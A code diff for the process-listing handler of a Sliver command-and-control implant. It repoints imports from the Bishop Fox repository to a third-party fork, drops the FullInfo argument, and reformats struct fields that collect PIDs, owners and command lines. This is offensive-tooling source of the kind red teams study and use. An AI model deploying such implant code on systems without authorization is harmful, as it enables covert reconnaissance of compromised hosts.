@@ -23,9 +23,9 @@ import (
 	"log"
 	// {{end}}
 
-	"github.com/bishopfox/sliver/implant/sliver/ps"
-	"github.com/bishopfox/sliver/protobuf/commonpb"
-	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/gsmith257-cyber/better-sliver-package/implant/sliver/ps"
+	"github.com/gsmith257-cyber/better-sliver-package/protobuf/commonpb"
+	"github.com/gsmith257-cyber/better-sliver-package/protobuf/sliverpb"
 	"google.golang.org/protobuf/proto"
 )
 
@@ -38,7 +38,7 @@ func psHandler(data []byte, resp RPCResponse) {
 		// {{end}}
 		return
 	}
-	procs, err := ps.Processes(psListReq.FullInfo)
+	procs, err := ps.Processes()
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("failed to list procs %v", err)
@@ -51,10 +51,10 @@ func psHandler(data []byte, resp RPCResponse) {
 
 	for _, proc := range procs {
 		p := &commonpb.Process{
-			Pid:          int32(proc.Pid()),
-			Ppid:         int32(proc.PPid()),
-			Executable:   proc.Executable(),
-			Owner:        proc.Owner(),
+			Pid:        int32(proc.Pid()),
+			Ppid:       int32(proc.PPid()),
+			Executable: proc.Executable(),
+			Owner:      proc.Owner(),
 			Architecture: proc.Architecture(),
 		}
 		p.CmdLine = proc.(*ps.WindowsProcess).CmdLine()
